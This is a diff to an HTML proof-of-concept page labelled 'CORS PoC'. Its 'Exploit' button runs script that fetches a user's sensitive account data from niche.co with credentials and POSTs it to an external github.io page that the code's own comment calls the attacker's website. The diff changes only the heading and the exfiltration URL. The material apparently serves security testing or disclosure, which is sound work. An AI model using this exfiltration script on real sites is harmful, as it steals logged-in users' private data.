@@ -2,7 +2,7 @@
 <html>
 <body>
 <center>
-<h2>---CORS-1.1</h2>
+<h2>CORS PoC</h2>
 <html>
 <body>
 <button type='button' onclick='cors()'>Exploit</button>
@@ -14,7 +14,7 @@ xhttp.onreadystatechange = function() {
 if (this.readyState == 4 && this.status == 200) {
 var a = this.responseText; // Sensitive data from niche.co about user account
 document.getElementById("demo").innerHTML = a;
-xhttp.open("POST", "https://verdecard2023.github.io/CORS/index.html", true);// Sending that data to Attacker's website
+xhttp.open("POST", "https://verdecard2023.github.io/CORS/", true);// Sending that data to Attacker's website
 xhttp.withCredentials = true;
 console.log(a);
 xhttp.send("data="+a);
